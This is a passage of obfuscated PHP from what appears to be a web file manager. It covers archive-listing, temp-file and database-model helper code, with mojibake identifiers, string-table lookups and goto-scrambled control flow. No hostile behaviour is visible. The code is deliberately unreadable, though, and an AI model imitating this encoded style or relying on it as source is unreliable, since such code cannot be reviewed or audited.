$Fã∏ì¿≈Õ•[$E¢éú≤∑´ø[28]], REPEAT_RENAME_FOLDER, !0); $FáóçﬂÒÃò = parent::mkdir($A›⁄¬ªûπà . $EùÑÍêˆÆÔ); $Fã∏ì¿≈Õ• = array($E¢éú≤∑´ø[76] => $FáóçﬂÒÃò); } } $FáóçﬂÒÃò = $Fã∏ì¿≈Õ•[$E¢éú≤∑´ø[76]]; goto cÑ°ââÜ¥µ; FàÔâô·¬Ò: $E¢éú≤∑´ø =& $_SERVER[™⁄»üÆ]; $c’„Õ·È®¿ = $fÓ÷É¶È¡ [$E¢éú≤∑´ø[76]]; $FáóçﬂÒÃò = $fÓ÷É¶È¡ [$E¢éú≤∑´ø[1090]]; goto dË°∑ÓÕﬂó; dà¬ã¨–≤–: } public static function unzipList($B°¢§Õ’ªŸ) { goto EåÊ‡é•∏¿; fÇÉı¶‘ã±: $F…·ºù∑Â⁄ = self::iconvSystem($F…·ºù∑Â⁄); if ($d⁄á”ë≈”õ >= 0) { $A¥£ñÇÿŒã = isset($B°¢§Õ’ªŸ[$f¨óÂ·ﬂçà[1102]]) ? $B°¢§Õ’ªŸ[$f¨óÂ·ﬂçà[1102]] : !1; $F•Á—™õ¿ï = isset($B°¢§Õ’ªŸ[$f¨óÂ·ﬂçà[28]]) ? $B°¢§Õ’ªŸ[$f¨óÂ·ﬂçà[28]] : $f¨óÂ·ﬂçà[33]; KodArchive::filePreview($F…·ºù∑Â⁄, $d⁄á”ë≈”õ, $A¥£ñÇÿŒã, $F•Á—™õ¿ï); self::archiveExt(); die; } $F¬¥´¡ä‡÷ = KodArchive::listContent($F…·ºù∑Â⁄); goto E˘Öâ∫≥Ñè; fìÕΩ°ÀÕÌ: if (isset($c≠íÚÇòÁû)) { $CÇÖÙåü»› = array($c≠íÚÇòÁû[$f¨óÂ·ﬂçà[76]], $c≠íÚÇòÁû[$f¨óÂ·ﬂçà[1098]], $c≠íÚÇòÁû[$f¨óÂ·ﬂçà[28]]); $EÉû¯¬å÷î = md5(implode($f¨óÂ·ﬂçà[71], $CÇÖÙåü»›)) . $f¨óÂ·ﬂçà[95] . get_path_ext($c≠íÚÇòÁû[$f¨óÂ·ﬂçà[28]]); } else { $CÇÖÙåü»› = array($B÷∫ê≈é›¥[$f¨óÂ·ﬂçà[28]], $B÷∫ê≈é›¥[$f¨óÂ·ﬂçà[76]], $B÷∫ê≈é›¥[$f¨óÂ·ﬂçà[78]]); $EÉû¯¬å÷î = md5(implode($f¨óÂ·ﬂçà[71], $CÇÖÙåü»›)) . $f¨óÂ·ﬂçà[95] . $bÕÜâ–äƒæ; } if ($d⁄á”ë≈”õ == -1) { $bÖ»¶º ò≥ = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\126\x69\x65\x77\57{$CΩ≤–ã¶‘ê}\x2f{$EÉû¯¬å÷î}\56\x6c\x6f\x67"; $bÊÁÆ¬ÖúÛ = self::infoFull($bÖ»¶º ò≥); if ($bÊÁÆ¬ÖúÛ) { $bÖ»¶º ò≥ = $bÊÁÆ¬ÖúÛ[$f¨óÂ·ﬂçà[76]]; $f˘ùùÊåÖ∏ = self::getContent($bÖ»¶º ò≥); if ($f˘ùùÊåÖ∏) { $a⁄⁄–ãè¢∆ = json_decode($f˘ùùÊåÖ∏, !0); if (count($a⁄⁄–ãè¢∆) >= $EÇ«õ…¯‡) { show_json(sprintf(LNG($f¨óÂ·ﬂçà[1100]), count($a⁄⁄–ãè¢∆)), !1); } return $a⁄⁄–ãè¢∆; } } else { $bÖ»¶º ò≥ = self::mkfile($bÖ»¶º ò≥); } } $c⁄Œ»ŸÑë◊ = TEMP_FILES . $CΩ≤–ã¶‘ê; goto DòŸÃÕ†È´; EåÊ‡é•∏¿: $f¨óÂ·ﬂçà =& $_SERVER[™⁄»üÆ]; $b∑ÁàΩïÑÌ = $B°¢§Õ’ªŸ[$f¨óÂ·ﬂçà[76]]; $d⁄á”ë≈”õ = isset($B°¢§Õ’ªŸ[$f¨óÂ·ﬂçà[1098]]) ? $B°¢§Õ’ªŸ[$f¨óÂ·ﬂçà[1098]] : -1; goto F≤ê˜¡âª; cÿÖ‹∂•’∂: $B÷∫ê≈é›¥ = self::info($b‡î¢ë…Ñç); $bÕÜâ–äƒæ = self::fileExt($B÷∫ê≈é›¥); $CΩ≤–ã¶‘ê = self::tmpFileName($B÷∫ê≈é›¥); goto fìÕΩ°ÀÕÌ; DπÆ“À‚ã: $a⁄⁄–ãè¢∆ = json_encode($F¬¥´¡ä‡÷[$f¨óÂ·ﬂçà[1096]]); self::setContent($bÖ»¶º ò≥, $a⁄⁄–ãè¢∆); if (count($F¬¥´¡ä‡÷[$f¨óÂ·ﬂçà[1096]]) >= $EÇ«õ…¯‡) { show_json(sprintf(LNG($f¨óÂ·ﬂçà[1100]), count($F¬¥´¡ä‡÷[$f¨óÂ·ﬂçà[1096]])), !1); } goto EãÎ¢¨¨Ãﬁ; EãÎ¢¨¨Ãﬁ: return $F¬¥´¡ä‡÷[$f¨óÂ·ﬂçà[1096]]; goto AÂ÷î´Ã€û; E˘Öâ∫≥Ñè: self::archiveExt(); del_dir($c⁄Œ»ŸÑë◊); if (!$F¬¥´¡ä‡÷[$f¨óÂ·ﬂçà[1094]]) { show_json($F¬¥´¡ä‡÷[$f¨óÂ·ﬂçà[1096]], !1); } goto DπÆ“À‚ã; F≤ê˜¡âª: $EÇ«õ…¯‡ = 50000; if (request_url_safe($b∑ÁàΩïÑÌ)) { $c≠íÚÇòÁû = parse_url_query($b∑ÁàΩïÑÌ); if (!isset($c≠íÚÇòÁû[$f¨óÂ·ﬂçà[76]])) { show_json($f¨óÂ·ﬂçà[1099], !1); } } $b‡î¢ë…Ñç = isset($c≠íÚÇòÁû) ? $c≠íÚÇòÁû[$f¨óÂ·ﬂçà[76]] : $b∑ÁàΩïÑÌ; goto cÿÖ‹∂•’∂; DòŸÃÕ†È´: if (!is_dir($c⁄Œ»ŸÑë◊)) { mk_dir($c⁄Œ»ŸÑë◊); } $F…·ºù∑Â⁄ = $c⁄Œ»ŸÑë◊ . $f¨óÂ·ﬂçà[8] . $EÉû¯¬å÷î; if (!@file_exists(self::iconvSystem($F…·ºù∑Â⁄))) { if (isset($c≠íÚÇòÁû)) { url_request($b∑ÁàΩïÑÌ, $f¨óÂ·ﬂçà[1101], $F…·ºù∑Â⁄); } else { $CôáÉ»„‰ª = self::localFilePath($b∑ÁàΩïÑÌ, $bÕÜâ–äƒæ); $F…·ºù∑Â⁄ = $CôáÉ»„‰ª ? $CôáÉ»„‰ª : self::download($b∑ÁàΩïÑÌ, $F…·ºù∑Â⁄); } } goto fÇÉı¶‘ã±; AÂ÷î´Ã€û: } private static function fileExt($B∞ƒ‘©ï±ï) { $cÊ¬∏¬∫µÀ =& $_SERVER[™⁄»üÆ]; $F∏∞Ì∂°±ä = $B∞ƒ‘©ï±ï[$cÊ¬∏¬∫µÀ[168]]; if ($F∏∞Ì∂°±ä == $cÊ¬∏¬∫µÀ[1103]) { $EÑêË⁄—¶ü = $cÊ¬∏¬∫µÀ[1104]; if (substr($B∞ƒ‘©ï±ï[$cÊ¬∏¬∫µÀ[28]], -strlen($EÑêË⁄—¶ü)) == $EÑêË⁄—¶ü) { $F∏∞Ì∂°±ä = $cÊ¬∏¬∫µÀ[1105]; } } self::archiveExt($F∏∞Ì∂°±ä); return $F∏∞Ì∂°±ä; } private static function zipFileList($c∆°Ô¶Ê’ , $C‡àÛ»¬»ê = false) { $Eºòë öÂö =& $_SERVER[™⁄»üÆ]; $dÚÛƒô°åÛ = array(); foreach ($c∆°Ô¶Ê’  as $dèË¶∆¨àç) { $bÒ—’êèÛÇ = $dèË¶∆¨àç[$Eºòë öÂö[76]]; if ($C‡àÛ»¬»ê) { $bÒ—’êèÛÇ = self::copy($dèË¶∆¨àç[$Eºòë öÂö[76]], $C‡àÛ»¬»ê, $Eºòë öÂö[802]); } else { $AË‘√ŒåÉí = self::init($dèË¶∆¨àç[$Eºòë öÂö[76]]); if ($AË‘√ŒåÉí->getType() == $Eºòë öÂö[106]) { $bÒ—’êèÛÇ = $AË‘√ŒåÉí->path; } } if ($bÒ—’êèÛÇ && self::local()->exist($bÒ—’êèÛÇ)) { $dÚÛƒô°åÛ[$dèË¶∆¨àç[$Eºòë öÂö[76]]] = $bÒ—’êèÛÇ; } } if (!empty($dÚÛƒô°åÛ)) { return array_values($dÚÛƒô°åÛ); } show_json(LNG($Eºòë öÂö[1069]), !1); } public static function tmpFileName($c√ÓÏ©ˆ°à) { $fá«¢Ïõ≈ç =& $_SERVER[™⁄»üÆ]; $DÜ∆Ωéç§ = array($c√ÓÏ©ˆ°à[$fá«¢Ïõ≈ç[28]], $c√ÓÏ©ˆ°à[$fá«¢Ïõ≈ç[76]], $c√ÓÏ©ˆ°à[$fá«¢Ïõ≈ç[78]], $c√ÓÏ©ˆ°à[$fá«¢Ïõ≈ç[503]]); return md5(implode($fá«¢Ïõ≈ç[71], $DÜ∆Ωéç§)); } private static function localFilePath($D†≥°ÎœÀ≈, $fÀê∫›Ò“◊) { goto EÏÇµÃ”èπ; Aõ∑Ôå˜Íå: if ($E¨Õ∞Ü‹îÂ == $Cî≈“üŸëå[106] || $E¨Õ∞Ü‹îÂ == $Cî≈“üŸëå[1109]) { if (!$fÀæ¯•≠˜–->exist($fÀæ¯•≠˜–->path)) { show_json(LNG($Cî≈“üŸëå[105]), !1); } return $fÀæ¯•≠˜–->path; } return !1; goto E´¿•∏ùÈË; e∑åıÔçñ©: if ($FËÎì€ïﬁ∞[$Cî≈“üŸëå[29]] == KodIO::KOD_SOURCE) { $C¥Î≤•ï≠û = Model($Cî≈“üŸëå[809])->fileInfoGet(KodIO::sourceID($D†≥°ÎœÀ≈)); if (!$C¥Î≤•ï≠û[$Cî≈“üŸëå[76]]) { show_json($Cî≈“üŸëå[1108], !1); } $D†≥°ÎœÀ≈ = $C¥Î≤•ï≠û[$Cî≈“üŸëå[76]]; } $fÀæ¯•≠˜– = self::init($D†≥°ÎœÀ≈); $E¨Õ∞Ü‹îÂ = $fÀæ¯•≠˜–->getType(); goto Aõ∑Ôå˜Íå; EÏÇµÃ”èπ: $Cî≈“üŸëå =& $_SERVER[™⁄»üÆ]; if ($fÀê∫›Ò“◊ == $Cî≈“üŸëå[1106] && strtoupper(substr(PHP_OS, 0, 3)) == $Cî≈“üŸëå[1107]) { return !1; } $FËÎì€ïﬁ∞ = KodIO::parse($D†≥°ÎœÀ≈); goto e∑åıÔçñ©; E´¿•∏ùÈË: } private static function archiveExt($c€ÁÜëØÉ‹ = '') { $GLOBALS[$_SERVER[™⁄»üÆ][1110]] = $c€ÁÜëØÉ‹; } } goto e¯áƒÜπêè; dı–ôõﬂÒ¢: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\x54\x69\x6d\x65", "\x74\x69\155\x65", "\151\x6e\x73\145\162\x74\x2c\x75\x70\144\x61\x74\145", "\146\165\156\x63\x74\x69\157\x6e"), array("\x63\162\145\141\164\145\x54\151\155\x65", "\164\151\155\x65", "\151\156\163\x65\x72\164", "\146\165\x6e\143\164\x69\x6f\x6e")); public function setDataAuto($A—´–ÖíÊ¥) { $this->dataAuto = $A—´–ÖíÊ¥; } public function __construct($b÷Öò‘®ïæ = '', $c”‹Û™∑‡≤ = '', $dó·¡Ãóªà = '') { parent::__construct($b÷Öò‘®ïæ, $c”‹Û™∑‡≤, $dó·¡Ãóªà); } protected $tableMeta = array(); protected function _beforeInsert(&$EúèöÉå§—, $bˆíŸÑ°ˆÖ) { $b™Ì≠ê±âî =& $_SERVER[™⁄»üÆ]; if (!$this->checkDataAutoHas($b™Ì≠ê±âî[353])) { return; } $this->dataBeforeFilter($EúèöÉå§—, $b™Ì≠ê±âî[353]); } protected function _beforeUpdate(&$CÃæˆﬁ˜äÜ, $cÛﬁÃüÏæ®) { $f‹√ÃÍŒÖ— =& $_SERVER[™⁄»üÆ]; if (!$this->checkDataAutoHas($f‹√ÃÍŒÖ—[354])) { return; } $this->dataBeforeFilter($CÃæˆﬁ˜äÜ, $f‹√ÃÍŒÖ—[354]); } protected function _afterSelect(&$fòÀîè¥ö√, $cﬂù¢ªèÜü) { if (!is_array($fòÀîè¥ö√)) { return; } if (!$this->checkDataAutoHas($_SERVER[™⁄»üÆ][355])) { return; } foreach ($fòÀîè¥ö√ as &$Dı–◊ŒÜøé) { $this->dataAfterFilter($Dı–◊ŒÜøé); } unset($Dı–◊ŒÜøé); } protected function _afterFind(&$dÕ“∫Éﬂà…, $C‚ÜﬁÎÍÊ‹) { if (!is_array($dÕ“∫Éﬂà…)) { return; } if (!$this->checkDataAutoHas($_SERVER[™⁄»üÆ][355])) { return; } $this->dataAfterFilter($dÕ“∫Éﬂà…); } public static function textEncode($dœñ€Ò”ü±) { if (!$dœñ€Ò”ü±) { return $dœñ€Ò”ü±; } $c¯Óãª¨… = json_encode($dœñ€Ò”ü±); $c¯Óãª¨… = preg_replace_callback($_SERVER[™⁄»üÆ][356], function ($b◊äÖ£ñ¶…) { return addslashes($b◊äÖ£ñ¶…[0]); }, $c¯Óãª¨…); return json_decode($c¯Óãª¨…); } public static function textDecode($c∏Ìˆ»èÜ¬) { $dâŒ˘∂í‹Ì =& $_SERVER[™⁄»üÆ]; $aâ·óäùÏ¥ = json_encode($c∏Ìˆ»èÜ¬); $aâ·óäùÏ¥ = preg_replace_callback($dâŒ˘∂í‹Ì[357], function ($e„€éº•É¡) { return $_SERVER[™⁄»üÆ][97]; }, $aâ·óäùÏ¥); return json_decode($aâ·óäùÏ¥); } public function setAutoIncrement($Aä™≤‘ı›≈) { $F†ÿÈ⁄Ìﬂø = array($this->getPk() => $Aä™≤‘ı›≈); $dê¬∑ô‚∫◊ = $this->data($F†ÿÈ⁄Ìﬂø)->add(); if ($dê¬∑ô‚∫◊) { $this->delete($dê¬∑ô‚∫◊); } } public function getAutoIncrement() { $b√Ç∞˜àÔ⁄ = $this->getTableName(); $Dá≠Œ‚©â∞ = $this->max($this->getPk()); $Bü¨≠∏è¯Ø = $this->query("\163\x68\x6f\167\40\x74\x61\x62\x6c\145\x20\163\164\141\x74\165\x73\x20\x77\150\x65\x72\145\x20\x4e\x61\x6d\x65\75\x27{$b√Ç∞˜àÔ⁄}\47"); $FØôá¥õ·ö = $Bü¨≠∏è¯Ø[0][$_SERVER[™⁄»üÆ][358]]; $A‰√€ßã˜à = max($Dá≠Œ‚©â∞, $FØôá¥õ·ö); return $A‰√€ßã˜à; } protected function _callBefore($EìÕÖ∫µçì, $dó—ªÆ»ï∆) { return $this->cacheCallCheck($EìÕÖ∫µçì, $dó—ªÆ»ï∆, !1); } protected function _callAfter($Fàª¨æı‘Ó, $bÙÂº†áõç) { return $this->cacheCallCheck($Fàª¨æı‘Ó, $bÙÂº†áõç, !0); } protected function cacheFunctionAlias($c·ΩêÒá≤£) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($fû‰äﬁÔ·ô, $a∂ñˆù‡ñﬁ, $dà⁄éãµØı = false) { $B⁄Ú≠≈®¿∑ = $this->cacheFunctionAlias($a∂ñˆù‡ñﬁ); if (!$B⁄Ú≠≈®¿∑) { return; } foreach ($B⁄Ú≠≈®¿∑ as $C◊ƒØ€Ñ¶ë => $e°€âë¯’) { $C´Öú€ ´à = $e°€âë¯’[0]; $B£®∂ÈÃÊ = explode($_SERVER[™⁄»üÆ][47], $e°€âë¯’[1]); if ($fû‰äﬁÔ·ô == $C◊ƒØ€Ñ¶ë) { return $this->cacheFunctionGet($C◊ƒØ€Ñ¶ë, $C´Öú€ ´à); } if ($dà⁄éãµØı && in_array($fû‰äﬁÔ·ô, $B£®∂ÈÃÊ)) { $this->cacheFunctionClear($C◊ƒØ€Ñ¶ë, $C´Öú€ ´à); } } } public function cacheFunctionGet($AÛŸ„®µ∑ó, $DÏœƒÜ¢¯ﬂ) { $eè¶‹àúä“ = $this->cacheKeyMake($AÛŸ„®µ∑ó, $DÏœƒÜ¢¯ﬂ); $EáÚŒº’û† = Cache::get($eè¶‹àúä“); if (!is_array($EáÚŒº’û†)) { $EáÚŒº’û† = call_user_func_array(array($this, $AÛŸ„®µ∑ó), array($DÏœƒÜ¢¯ﬂ, !0)); Cache::set($eè¶‹àúä“, $EáÚŒº’û†); } return $EáÚŒº’û†; } public function cacheFunctionClear($aá¢≈Ñ≤Êı, $bõÍÌé’”“) { $d†◊éñ¡‡Ë = $bõÍÌé’”“; if (!is_array($bõÍÌé’”“)) { $d†◊éñ¡‡Ë = array($bõÍÌé’”“); } foreach ($d†◊éñ¡‡Ë as $B»•†⁄ô›Ÿ) { $D∏Í€Ù· ´ = $this->cacheKeyMake($aá¢≈Ñ≤Êı, $B»•†⁄ô›Ÿ); Cache::remove($D∏Í€Ù· ´); } } private function cacheKeyMake($få·Èà∏ËÆ, $d‡À›áÔåñ) { $FÇµöÕ¥—» =& $_SERVER[™⁄»üÆ]; return get_class($this) . $FÇµöÕ¥—»[71] . $få·Èà∏ËÆ . $FÇµöÕ¥—»[359] . $d‡À›áÔåñ; } protected function selectPageReset() { $BÛﬁ≠ä∏Ò¥ =& $_SERVER[™⁄»üÆ]; if (isset($GLOBALS[$BÛﬁ≠ä∏Ò¥[360]])) { return; } $GLOBALS[$BÛﬁ≠ä∏Ò¥[360]] = isset($GLOBALS[$BÛﬁ≠ä∏Ò¥[7]][$BÛﬁ≠ä∏Ò¥[361]]) ? $GLOBALS[$BÛﬁ≠ä∏Ò¥[7]][$BÛﬁ≠ä∏Ò¥[361]] : !1; $GLOBALS[$BÛﬁ≠ä∏Ò¥[362]] = isset($GLOBALS[$BÛﬁ≠ä∏Ò¥[7]][$BÛﬁ≠ä∏Ò¥[351]]) ? $GLOBALS[$BÛﬁ≠ä∏Ò¥[7]][$BÛﬁ≠ä∏Ò¥[351]] : !1; $GLOBALS[$BÛﬁ≠ä∏Ò¥[7]][$BÛﬁ≠ä∏Ò¥[361]] = !1; $GLOBALS[$BÛﬁ≠ä∏Ò¥[7]][$BÛﬁ≠ä∏Ò¥[351]] = !1; } protected function selectPageRestore() { $DòÃìÇîﬂ— =& $_SERVER[™⁄»üÆ]; if (!isset($GLOBALS[$DòÃìÇîﬂ—[360]])) { return; } $GLOBALS[$DòÃìÇîﬂ—[7]][$DòÃìÇîﬂ—[361]] = $GLOBALS[$DòÃìÇîﬂ—[360]]; $GLOBALS[$DòÃìÇîﬂ—[7]][$DòÃìÇîﬂ—[351]] = $GLOBALS[$DòÃìÇîﬂ—[362]]; unset($GLOBALS[$DòÃìÇîﬂ—[360]]); unset($GLOBALS[$DòÃìÇîﬂ—[362]]); } protected function selectPage($f¨æ¯Ç¯∞” = 200, $c¯‚ãÎﬁπ≈ = 1) { goto dè„ÁÇÉ’ê; AéŸï¢∏›§: $cò≈§€Ç·· = 50000; $f¨æ¯Ç¯∞” = isset($in[$fùœúœ«â∆[361]]) && $in[$fùœúœ«â∆[361]] ? $in[$fùœúœ«â∆[361]] : $f¨æ¯Ç¯∞”; if ($f¨æ¯Ç¯∞” === -1) { $in[$fùœúœ«â∆[361]] = !1; $cò≈§€Ç·· = 100000000; $f¨æ¯Ç¯∞” = $cò≈§€Ç··; } goto Eüÿµ≤™Öü; fÁìÎ£œıƒ: $f¨æ¯Ç¯∞” = $f¨æ¯Ç¯∞” <= 5 ? 5 : ($f¨æ¯Ç¯∞” >= $cò≈§€Ç·· ? $cò≈§€Ç·· : $f¨æ¯Ç¯∞”); $c¯‚ãÎﬁπ≈ = intval(isset($in[$fùœúœ«â∆[351]]) && $in[$fùœúœ«â∆[351]] ? $in[$fùœúœ«â∆[351]] : $c¯‚ãÎﬁπ≈); $c¯‚ãÎﬁπ≈ = $c¯‚ãÎﬁπ≈ <= 1 ? 1 : $c¯‚ãÎﬁπ≈; goto F™Ÿ†Òœó¬; eä°Æ„îéÀ: return $A‰†µçØΩ…; goto FÿêÔâÑÇª; dè„ÁÇÉ’ê: $fùœúœ«â∆ =& $_SERVER[™⁄»üÆ]; global $in; $Aı§î‹¬ÿ’ = $this->optionsValue(); goto AéŸï¢∏›§; F∏›∞‘ç§‹: if (!is_array($BıÁü∏‹ØÎ)) { $BıÁü∏‹ØÎ = array(); } if ($BÚ‚ﬂÆÕ›ú == 1) { $B‹Ÿö˘ÒçÀ = count($BıÁü∏‹ØÎ); } $A‰†µçØΩ… = array($fùœúœ«â∆[364] => array($fùœúœ«â∆[365] => $B‹Ÿö˘ÒçÀ, $fùœúœ«â∆[361] => $f¨æ¯Ç¯∞”, $fùœúœ«â∆[351] => $c¯‚ãÎﬁπ≈, $fùœúœ«â∆[366] => $BÚ‚ﬂÆÕ›ú), $fùœúœ«â∆[367] => $BıÁü∏‹ØÎ); goto eä°Æ„îéÀ; F™Ÿ†Òœó¬: $BıÁü∏‹ØÎ = array(); $bá∞¿ûÁÖÇ = 1; if ($c¯‚ãÎﬁπ≈ == 1 && $bá∞¿ûÁÖÇ) { $this->optionsValue($Aı§î‹¬ÿ’); $BıÁü∏‹ØÎ = $this->page($c¯‚ãÎﬁπ≈, $f¨æ¯Ç¯∞”)->select(); $B‹Ÿö˘ÒçÀ = is_array($BıÁü∏‹ØÎ) ? count($BıÁü∏‹ØÎ) : 0; if ($B‹Ÿö˘ÒçÀ < $f¨æ¯Ç¯∞”) { $BÚ‚ﬂÆÕ›ú = 1; } else { $this->optionsValue($eØèáÒÑ“∞); $B‹Ÿö˘ÒçÀ = intval($this->count()); $BÚ‚ﬂÆÕ›ú = ceil($B‹Ÿö˘ÒçÀ / $f¨æ¯Ç¯∞”); } } else { $this->optionsValue($eØèáÒÑ“∞); $B‹Ÿö˘ÒçÀ = intval($this->count()); $BÚ‚ﬂÆÕ›ú = ceil($B‹Ÿö˘ÒçÀ / $f¨æ¯Ç¯∞”); $c¯‚ãÎﬁπ≈ = $c¯‚ãÎﬁπ≈ >= $BÚ‚ﬂÆÕ›ú ? $BÚ‚ﬂÆÕ›ú : $c¯‚ãÎﬁπ≈; $this->optionsValue($Aı§î‹¬ÿ’); $BıÁü∏‹ØÎ = $this->page($c¯‚ãÎﬁπ≈, $f¨æ¯Ç¯∞”)->select(); } goto F∏›∞‘ç§‹; Eüÿµ≤™Öü: $eØèáÒÑ“∞ = $Aı§î‹¬ÿ’; $eØèáÒÑ“∞[$fùœúœ«â∆[363]] = array(); $f¨æ¯Ç¯∞” = intval($f¨æ¯Ç¯∞”); goto fÁìÎ£œıƒ; FÿêÔâÑÇª: } protected function checkLength($D¥ﬁ√Èˆ‹ã, $Dè∂ÇáØ©ﬁ = 0, $B™¿‡ê–ö– = '') { $có≠¯Ëàﬂ =& $_SERVER[™⁄»üÆ]; $Dè∂ÇáØ©ﬁ = $Dè∂ÇáØ©ﬁ ? $Dè∂ÇáØ©ﬁ : 65536; if (!$D¥ﬁ√Èˆ‹ã || strlen($D¥ﬁ√Èˆ‹ã) < $Dè∂ÇáØ©ﬁ) { return; } $B™¿‡ê–ö– = $B™¿‡ê–ö– ? $B™¿‡ê–ö– . $có≠¯Ëàﬂ[68] : $có≠¯Ëàﬂ[33]; show_json($B™¿‡ê–ö– . LNG($có≠¯Ëàﬂ[368]) . "\x28{$Dè∂ÇáØ©ﬁ}\51", !1); } protected function metaSet($Aø˘·‡Ãñç, $Açåç‘åáå = null, $a√ãÆ€ç„« = null) { goto eò“˘·Éÿá; Eïß—›≈ü‹: $E†≥äÛå·‘ = $this->tableMeta[$AËœÍÁâÌó[370]]; $e¢¶ª¡√‡á = Model($E†≥äÛå·‘); $cè¥µÖ´ = array($A≈Ìí£è¢© => $Aø˘·‡Ãñç, $AËœÍÁâÌó[371] => $Açåç‘åáå); goto Cõù‡ã‘Œ; CÑäã±Û«π: if (is_string($Açåç‘åáå)) { $b¨¡Ùãñ¶[$Açåç‘åáå] = $a√ãÆ€ç„«; } $C≥¨ÌÍ‡Ó = array(); foreach ($b¨¡Ùãñ¶ as $fûà∞∞›èË => $Eàíéùä…ì) { $this->checkLength($Eàíéùä…ì, !1, $E†≥äÛå·‘ . $AËœÍÁâÌó[4] . $fûà∞∞›èË); $C≥¨ÌÍ‡Ó[] = array($A≈Ìí£è¢© => $Aø˘·‡Ãñç, $AËœÍÁâÌó[93] => $fûà∞∞›èË, $AËœÍÁâÌó[372] => $Eàíéùä…ì); } goto BáúÚ‰·Ï»; eò“˘·Éÿá: $AËœÍÁâÌó =& $_SERVER[™⁄»üÆ]; if (!$this->tableMeta || !$Aø˘·‡Ãñç) { return !1; } $A≈Ìí£è¢© = $this->tableMeta[$AËœÍÁâÌó[369]]; goto Eïß—›≈ü‹; dèãÑ·ãØó: CacheLock::unlock($dÕâûÜÜ√Ö); return !0; goto E‚ÇöÜ£÷∂; BáúÚ‰·Ï»: $dÕâûÜÜ√Ö = $AËœÍÁâÌó[373] . $this->tableMeta; CacheLock::lock($dÕâûÜÜ√Ö); $e¢¶ª¡√‡á->where(array($A≈Ìí£è¢© => $Aø˘·‡Ãñç))->addAll($C≥¨ÌÍ‡Ó, array(), !0); goto dèãÑ·ãØó; Cõù‡ã‘Œ: if (is_null($Açåç‘åáå)) { return $e¢¶ª¡√‡á->where(array($A≈Ìí£è¢© => $Aø˘·‡Ãñç))->delete(); } if (is_null($a√ãÆ€ç„«) && is_string($Açåç‘åáå)) { return $e¢¶ª¡√‡á->where($cè¥µÖ´)->delete(); } $b¨¡Ùãñ¶ = is_array($Açåç‘åáå) ? $Açåç‘åáå : array(); goto CÑäã±Û«π; E‚ÇöÜ£÷∂: } public function metaGet($AÉ≈àùÇŒÒ, $AÉ¡ãÍ∂ª¬ = false) { goto fı¶ÇÍªéû; fı¶ÇÍªéû: $Aì≠©àÀø™ =& $_SERVER[™⁄»üÆ]; if (!$this->tableMeta) { return array(); } $CÛ∏·„ê„ù = $this->tableMeta[$Aì≠©àÀø™[369]]; goto eπë§ΩÃÖı; Bµ∫§Êö–ë: $C◊∫Öß≤££ = $b…Ç”ù»‰ì->field($Aì≠©àÀø™[374])->where($eéàü«˜÷°)->select(); $C◊∫Öß≤££ = array_to_keyvalue($C◊∫Öß≤££, $Aì≠©àÀø™[93], $Aì≠©àÀø™[372]); return $C◊∫Öß≤££; goto eô’Û‰§Ó√; eπë§ΩÃÖı: $b…Ç”ù»‰ì = Model($this->tableMeta[$Aì≠©àÀø™[370]]); if ($AÉ¡ãÍ∂ª¬) { $eéàü«˜÷° = array($CÛ∏·„ê„ù => $AÉ≈àùÇŒÒ, $Aì≠©àÀø™[93] => $AÉ¡ãÍ∂ª¬); return $b…Ç”ù»‰ì->where($eéàü«˜÷°)->getField($Aì≠©àÀø™[372]); } $eéàü«˜÷° = array($CÛ∏·„ê„ù => $AÉ≈àùÇŒÒ); goto Bµ∫§Êö–ë; eô’Û‰§Ó√: } private function checkDataAutoHas($FÕ∂î‘Ëçì) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Cƒ√·ï™∞Ï) { if (in_array($FÕ∂î‘Ëçì, explode($_SERVER[™⁄»üÆ][47], $Cƒ√·ï™∞Ï[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$aÁøÍ“Ãæû, $e÷‡∂ÇÑŸ∂) { $Eî‡â¨è≈É =& $_SERVER[™⁄»üÆ]; foreach ($this->dataAuto as $F—ëùﬁãó≤) { $c›⁄©¥œﬁﬁ = $F—ëùﬁãó≤[0]; if (!in_array($e÷‡∂ÇÑŸ∂, explode($Eî‡â¨è≈É[47], $F—ëùﬁãó≤[2]))) { continue; } switch (trim($F—ëùﬁãó≤[3])) { case $Eî‡â¨è≈É[319]: case $Eî‡â¨è≈É[320]: $cÉÀÃâœîÿ = $F—ëùﬁãó≤[1]; $dªü«‘⁄–Â = isset($F—ëùﬁãó≤[4]) ? (array) $F—ëùﬁãó≤[4] : array(); if ($cÉÀÃâœîÿ == $Eî‡â¨è≈É[197] && array_key_exists($c›⁄©¥œﬁﬁ, $aÁøÍ“Ãæû)) { if (!$aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ]) { unset($aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ]); } break; } if (isset($aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ])) { array_unshift($dªü«‘⁄–Â, $aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ]); } if ($Eî‡â¨è≈É[319] == $F—ëùﬁãó≤[3]) { $aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ] = call_user_func_array($cÉÀÃâœîÿ, $dªü«‘⁄–Â); } else { $aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ] = call_user_func_array(array(&$this, $cÉÀÃâœîÿ), $dªü«‘⁄–Â); } break; case $Eî‡â¨è≈É[271]: $aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ] = $aÁøÍ“Ãæû[$F—ëùﬁãó≤[1]]; break; case $Eî‡â¨è≈É[292]: if (isset($aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ]) && !is_string($aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ])) { $aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ] = json_encode_force($aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ]); } break; case $Eî‡â¨è≈É[321]: if ($aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ] === $Eî‡â¨è≈É[33]) { unset($aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ]); } break; case $Eî‡â¨è≈É[322]: $aÁøÍ“Ãæû[$c›⁄©¥œﬁﬁ] = $F—ëùﬁãó≤[1]; default: break; } } if ($e÷‡∂ÇÑŸ∂ == 